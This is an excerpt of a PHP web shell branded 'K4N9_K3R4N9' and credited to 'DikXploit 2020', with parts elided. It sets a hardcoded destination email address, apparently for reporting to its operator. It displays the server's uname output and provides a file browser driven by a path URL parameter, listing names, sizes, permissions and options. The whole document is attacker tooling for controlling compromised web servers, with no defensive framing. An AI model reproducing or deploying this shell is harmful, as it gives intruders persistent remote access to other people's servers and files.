...
$destinationmail = 'rochmanpatur5@gmail.com';
...
<html>
<head>
<title>\\>K4N9_K3R4N9<\\</title>
</head>';

?>

<center><img src="https://thumbs2.imgbox.com/be/1f/HoDQNqzd_t.jpeg" height="400px">
<style> 
@font-face {
...
echo '</head>
<body><b>
<H1><center><font color="white"><\\K4N9_K3R4NG>\\<</font></center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">

<tr><td>

<font color="red"><center>'.php_uname().'</center></font><br>';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = 
...
if($pat == '' && $id == 0){
$a = true;
echo '<font color=silver><center>path : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
...
<tr>
<th class=th_home style="background:black;color:lightblue;"><center>Name</center></th>
<th class=th_home style="background:black;color:lightblue;" ><center>Size</center></th>
<th class=th_home style="background:black;color:lightblue;" ><center>Perm</center></th>
<th class=th_home style="background:black;color:lightblue;" ><center>Options</center></th>
</tr> <tr>
...
echo '<br><center>&copy; DikXploit 2020</b></body>
</html>';
function perms($file){
